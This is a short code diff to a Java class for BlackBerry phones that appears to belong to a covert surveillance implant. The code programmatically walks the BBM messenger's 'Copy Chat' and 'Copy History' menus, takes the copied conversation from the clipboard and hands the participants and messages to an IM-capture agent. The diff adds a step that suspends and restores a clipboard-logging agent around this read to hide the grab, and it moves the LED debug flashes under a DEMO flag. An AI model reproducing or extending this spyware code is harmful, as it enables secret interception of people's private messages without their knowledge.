@@ -16,6 +16,7 @@ import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.agent.ClipBoardAgent;
 import blackberry.agent.ImAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -43,8 +44,8 @@ public class ConversationScreen {
     public synchronized void getConversationScreen() {
         try {
             if (bbmApplication == null || !Backlight.isEnabled()) {
-                //#ifdef DEBUG
-                debug.ledFlash(Debug.COLOR_RED);
+                //#ifdef DEMO
+                Debug.ledFlash(Debug.COLOR_RED);
                 //#endif
                 return;
             }
@@ -93,8 +94,8 @@ public class ConversationScreen {
                     ImAgent agent = ImAgent.getInstance();
                     agent.add(partecipants, lines);
 
-                    //#ifdef DEBUG
-                    debug.ledFlash(Debug.COLOR_YELLOW);
+                    //#ifdef DEMO
+                    Debug.ledFlash(Debug.COLOR_YELLOW);
                     //#endif
                 }
             }
@@ -125,7 +126,10 @@ public class ConversationScreen {
         if (MenuWalker.walk(new String[] { "Copy Chat", "Copy History" },
                 screen, true)) {
 
+            ClipBoardAgent.getInstance().suspendClip();
             clip = (String) Clipboard.getClipboard().get();
+            ClipBoardAgent.getInstance().setClip(clip);
+            
             try {
                 //Clipboard.getClipboard().put(before);
             } catch (Exception ex) {
